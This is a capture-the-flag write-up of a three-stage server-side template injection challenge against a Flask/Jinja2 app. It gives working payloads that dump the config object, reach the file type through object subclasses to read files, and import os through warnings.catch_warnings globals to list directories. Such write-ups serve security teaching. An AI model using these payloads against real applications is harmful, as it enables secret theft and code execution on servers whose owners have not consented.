# Hello, friend! writeup

### Stage 1

The site uses `render_template_string()` with user-controlled input, so we have ourselves a nice SSTI vulnerability.

The first task tells us to check the `config` object, which contains Flask configuration options (http://flask.pocoo.org/docs/0.12/config/).

Let's check out the object in the python interpreter!

```
>>> from flask import Flask
>>> app = Flask(__name__)
>>> config
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  NameError: name 'config' is not defined
>>> app.config
  <Config {'JSON_AS_ASCII': True, 'USE_X_SENDFILE': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_NAME': 'session', 'LOGGER_NAME': '__main__', 'DEBUG': False, 'SECRET_KEY': None, 'MAX_CONTENT_LENGTH': None, 'APPLICATION_ROOT': None, 'SERVER_NAME': None, 'PREFERRED_URL_SCHEME': 'http', 'JSONIFY_PRETTYPRINT_REGULAR': True, 'TESTING': False, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'PROPAGATE_EXCEPTIONS': None, 'TRAP_BAD_REQUEST_ERRORS': False, 'JSON_SORT_KEYS': True, 'SESSION_COOKIE_HTTPONLY': True, 'SEND_FILE_MAX_AGE_DEFAULT': 43200, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SESSION_COOKIE_SECURE': False, 'TRAP_HTTP_EXCEPTIONS': False}>
```

Simply writing `{{ config }}` in the URL will allow us to view all the values in the HTML of the site. Or, we can write `{{ config.items() }}` to have the written out:
```
[('JSON_AS_ASCII', True), ('USE_X_SENDFILE', False), ('SESSION_COOKIE_PATH', None), ('SESSION_COOKIE_DOMAIN', None), ('SESSION_COOKIE_NAME', 'session'), ('FLAG', 'TG17{everyone_needs_a_little_introspection}'), ('LOGGER_NAME', '__main__'), ('DEBUG', False), ('SECRET_KEY', None), ('MAX_CONTENT_LENGTH', None), ('APPLICATION_ROOT', None), ('SERVER_NAME', 'localhost:1060'), ('PREFERRED_URL_SCHEME', 'http'), ('JSONIFY_PRETTYPRINT_REGULAR', True), ('TESTING', False), ('PERMANENT_SESSION_LIFETIME', datetime.timedelta(31)), ('PROPAGATE_EXCEPTIONS', None), ('TRAP_BAD_REQUEST_ERRORS', False), ('JSON_SORT_KEYS', True), ('SESSION_COOKIE_HTTPONLY', True), ('SEND_FILE_MAX_AGE_DEFAULT', 43200), ('PRESERVE_CONTEXT_ON_EXCEPTION', None), ('SESSION_COOKIE_SECURE', False), ('TRAP_HTTP_EXCEPTIONS', False)]!
```

Tasty flag for us: `TG17{everyone_needs_a_little_introspection}`.


### stage 2
Time to read a file!

Before testing stuff on the website, let's see what we can do in the interpreter.

```
>>> file("flag.txt")
<open file 'flag.txt', mode 'r' at 0x10e586420>
>>> file("flag.txt").read()
'yolo\n'
>>>
```

Trying this on the site, however, gives us an internal server error :(

We have to find another way to access the `file` object. Luckily, we can do so with a neat trick to find all the subclasses of object!

```
>>> [].__class__.__base__.__subclasses__()
[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'file'>, <type 'PyCapsule'>, <type 'cell'>, <type 'callable-iterator'>, <type 'iterator'>, <type 'sys.long_info'>, <type 'sys.float_info'>, <type 'EncodingMap'>, <type 'fieldnameiterator'>, <type 'formatteriterator'>, <type 'sys.version_info'>, <type 'sys.flags'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zipimport.zipimporter'>, <type 'posix.stat_result'>, <type 'posix.statvfs_result'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>, <class '_abcoll.Container'>, <class '_abcoll.Callable'>, <type 'dict_keys'>, <type 'dict_items'>, <type 'dict_values'>, <class 'site._Printer'>, <class 'site._Helper'>, <type '_sre.SRE_Pattern'>, <type '_sre.SRE_Match'>, <type '_sre.SRE_Scanner'>, <class 'site.Quitter'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>]
>>> cnt = 0
>>> for c in [].__class__.__base__.__subclasses__():
...	if c == file:
...		print "yay: {}".format(cnt)
...	cnt += 1
...
yay: 40
>>> [].__class__.__base__.__subclasses__()[40]
<type 'file'>
```

Now, visiting `/{{ [].__class__.__base__.__subclasses__()[40]("flag.txt").read() }}` should give us the flag!

```
Hello TG17{templates_so_safe} !
```

### stage 3
Okay, so this time we have to list the current directory. There are many ways to achieve this in python, but I'll use `os.listdir()`.

With some experience from other CTF tasks where we had to break out of python jails, we know that the `warnings.catch_warnings` class contains a reference to the python builtin functions:
```
>>> s = [].__class__.__base__.__subclasses__()[59]
>>> s
<class 'warnings.catch_warnings'>
>>> s.__repr__.im_func.func_globals["__builtins__"]["__import__"]
<built-in function __import__>
```

With import, we can get access to `os.listdir()`.
Send this to the server: `[].__class__.__base__.__subclasses__()[59].__repr__.im_func.func_globals["__builtins__"]["__import__"]("os").listdir(".")`:
```
Hello ['flag.cfg', 'flag.txt', 'pwn', 'README.md', 'run.sh', 'secret', 'server.py', 'server_hard.py', 'the_flag_is_TG17{templating_done_right}', 'writeup.md']!
```

And we got our flag! `TG17{templating_done_right}`

### Resources
* https://nvisium.com/blog/2016/03/09/exploring-ssti-in-flask-jinja2/

* https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/
